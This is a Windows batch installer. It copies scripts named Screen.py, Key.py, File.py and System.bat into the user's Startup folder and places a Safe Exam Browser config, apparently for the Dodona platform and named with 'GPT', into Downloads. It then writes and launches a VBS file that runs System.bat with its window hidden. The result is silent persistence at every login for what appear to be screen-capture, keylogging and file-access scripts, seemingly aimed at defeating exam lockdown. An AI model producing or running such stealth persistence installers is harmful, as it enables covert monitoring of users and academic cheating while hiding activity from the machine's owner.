@echo off
setlocal

:: ====== BASE DIRECTORY ======
set BASEDIR=%~dp0

:: ====== SOURCE FILES ======
set FILE1=%BASEDIR%dist\Screen.py
set FILE2=%BASEDIR%dist\Key.py
set FILE3=%BASEDIR%dist\File.py
set FILE4=%BASEDIR%dist\Dodona_Seb_GPT.seb
set FILE5=%BASEDIR%dist\System.bat
set REQUIREMENTS=%BASEDIR%dist\requirements.txt

:: ====== DESTINATIONS ======
set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set DOWNLOADS=%USERPROFILE%\Downloads

copy "%FILE1%" "%STARTUP%" /Y
copy "%FILE2%" "%STARTUP%" /Y
copy "%FILE3%" "%STARTUP%" /Y
copy "%FILE5%" "%STARTUP%" /Y

copy "%FILE4%" "%DOWNLOADS%" /Y

echo Installing Python requirements...
python -m pip install -r "%REQUIREMENTS%"

:: ====== CREATE HIDDEN STARTUP LAUNCHER ======

echo Set WshShell = CreateObject("WScript.Shell") > "%STARTUP%\RunSystemHidden.vbs"
echo WshShell.Run Chr(34^) ^& "%STARTUP%\System.bat" ^& Chr(34^), 0 >> "%STARTUP%\RunSystemHidden.vbs"
echo Set WshShell = Nothing >> "%STARTUP%\RunSystemHidden.vbs"

:: ====== RUN IT NOW ======
start "" "%STARTUP%\RunSystemHidden.vbs"

echo Deployment complete.
pause